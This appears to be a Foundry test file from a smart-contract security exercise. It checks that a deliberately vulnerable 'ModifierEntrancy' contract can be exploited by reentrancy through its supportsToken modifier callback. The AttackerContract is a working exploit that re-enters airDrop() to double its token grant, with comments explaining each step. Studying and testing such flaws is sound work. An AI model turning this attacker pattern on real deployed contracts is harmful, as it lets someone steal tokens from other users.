
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ModifierEntrancy, attack} from "../src/ModifierEntrancy.sol";

contract TestReentrancyModifierEntrancy is Test {
    ModifierEntrancy public _contractUnderTest;
    AttackerContract public _attacker;

    function setUp() public {
        _contractUnderTest = new ModifierEntrancy();
        _attacker = new AttackerContract(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes() public {
        // Capture initial balance of attacker in the token contract
        uint256 initialBalance = _contractUnderTest.tokenBalance(address(_attacker));
        assertEq(initialBalance, 0, "Attacker should start with 0 tokens");

        // Trigger the attack
        _attacker.attack();

        // Verify the exploit succeeded - attacker should have more than 20 tokens
        // due to reentrancy (called airDrop twice)
        uint256 finalBalance = _contractUnderTest.tokenBalance(address(_attacker));
        
        // The exploit succeeds if the attacker got 40 tokens instead of 20
        // This happens because:
        // 1. First call to airDrop checks hasNoBalance (balance == 0) - passes
        // 2. Then supportsToken modifier calls attacker's supportsToken()
        // 3. Attacker re-enters airDrop, hasNoBalance still passes (state not updated yet)
        // 4. Second call's supportsToken is called, returns valid hash
        // 5. Second call adds 20 tokens
        // 6. First call continues and adds another 20 tokens
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
        assertEq(finalBalance, 40, "Attacker should have 40 tokens due to reentrancy");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract AttackerContract {
    ModifierEntrancy public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    bool private hasReentered;

    constructor(address victimAddress) {
        victim = ModifierEntrancy(victimAddress);
    }

    function attack() public {
        // Capture initial state
        uint256 initialBalance = victim.tokenBalance(address(this));
        
        // Reset state for attack
        attackCallCount = 0;
        hasReentered = false;
        exploitSucceeded = false;

        // Call the vulnerable function
        victim.airDrop();

        // Check if we got more tokens than expected (40 instead of 20)
        uint256 finalBalance = victim.tokenBalance(address(this));
        
        // If we have 40 tokens, the reentrancy worked
        // Normal behavior would give us only 20 tokens
        if (finalBalance == 40 && initialBalance == 0) {
            exploitSucceeded = true;
        }
    }

    // This function is called by the supportsToken modifier in ModifierEntrancy
    function supportsToken() external returns (bytes32) {
        attackCallCount++;
        
        // On the first call, re-enter the airDrop function
        // The hasNoBalance modifier has already passed at this point
        // but tokenBalance hasn't been updated yet
        if (!hasReentered) {
            hasReentered = true;
            victim.airDrop();
        }
        
        // Return the expected hash to pass the supportsToken modifier check
        return keccak256(abi.encodePacked("Nu Token"));
    }

    receive() external payable {}

    fallback() external payable {}
}
